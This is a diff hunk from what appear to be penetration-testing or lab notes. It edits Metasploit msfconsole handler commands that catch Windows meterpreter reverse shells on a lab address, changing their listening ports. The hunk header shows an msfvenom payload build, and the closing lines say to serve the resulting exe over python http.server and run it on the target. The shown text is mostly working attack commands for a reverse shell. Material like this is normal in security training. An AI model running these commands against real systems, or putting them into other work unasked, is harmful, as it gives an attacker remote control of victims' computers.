@@ -92,9 +92,9 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=5555 -f exe >
 
 In Linux terminal run the belows cmds to catch the reverse shell
 ```bash
-msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run"
-msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run"
-msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run"
+msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 3333; run"
+msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 4444; run"
+msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 5555; run"
 ```
 Then run server and download the exe and execute it
 -> python3 -m http.server 8000
